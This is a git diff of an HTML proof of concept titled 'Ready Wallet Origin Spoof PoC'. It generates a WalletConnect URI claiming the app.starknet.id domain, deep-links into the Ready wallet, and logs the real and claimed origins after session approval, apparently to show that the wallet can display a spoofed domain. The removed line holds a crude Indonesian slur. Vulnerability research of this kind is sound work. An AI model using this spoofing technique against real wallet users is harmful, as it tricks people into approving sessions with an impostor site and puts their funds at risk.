@@ -6,7 +6,11 @@
 </head>
 <body>
   <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">KONTOL connect prompt</button>
+  <button id="connect">Generate URI</button>
+  <br><br>
+  <a id="deeplink" href="#" style="display:none; padding:10px; background:#000; color:#fff; border-radius:8px;">
+    👆 TAP HERE TO OPEN READY WALLET
+  </a>
   <pre id="log"></pre>
 
   <script type="module">
@@ -53,40 +57,31 @@
         if (uri) {
           log('Real origin  : ' + REAL_ORIGIN);
           log('Claimed URL  : ' + CLAIMED_URL);
-          log('URI generated: ' + uri.substring(0, 60) + '...');
           log('');
-          log('Trying to open Ready Wallet...');
+          log('URI ready! Tap button di bawah untuk buka Ready Wallet');
 
-          // Coba buka Ready dulu
-          window.open('ready://', '_blank');
+          // Tampilkan sebagai link yang bisa di tap manual
+          const deeplink = document.getElementById('deeplink');
+          deeplink.href = `ready://wc?uri=${encodeURIComponent(uri)}`;
+          deeplink.style.display = 'block';
 
-          await new Promise(r => setTimeout(r, 1000));
+          log('Waiting for approval...');
 
-          // Kirim URI ke Ready
-          window.open(`ready://wc?uri=${encodeURIComponent(uri)}`, '_blank');
-
-          log('Waiting for user to approve in Ready Wallet...');
-          log('(Check domain shown in Ready Wallet popup!)');
-
-          // Tunggu approval
           try {
             const session = await approval();
             log('');
             log('=== SESSION APPROVED! ===');
-            log('Session topic: ' + session.topic);
 
             const accounts = session?.namespaces?.starknet?.accounts;
             if (accounts?.length > 0) {
               const account = accounts[0].split(':')[2];
               log('Account: ' + account);
+              log('');
+              log('Domain shown in Ready = ' + CLAIMED_URL + ' ?');
+              log('Real domain           = ' + REAL_ORIGIN);
             }
-
-            log('');
-            log('RESULT: Domain shown in Ready Wallet = ' + CLAIMED_URL);
-            log('RESULT: Real domain = ' + REAL_ORIGIN);
-            log('If Ready showed app.starknet.id → ORIGIN SPOOF CONFIRMED!');
           } catch(e) {
-            log('Approval error/timeout: ' + e.message);
+            log('Approval: ' + e.message);
           }
         }
       } catch(e) {
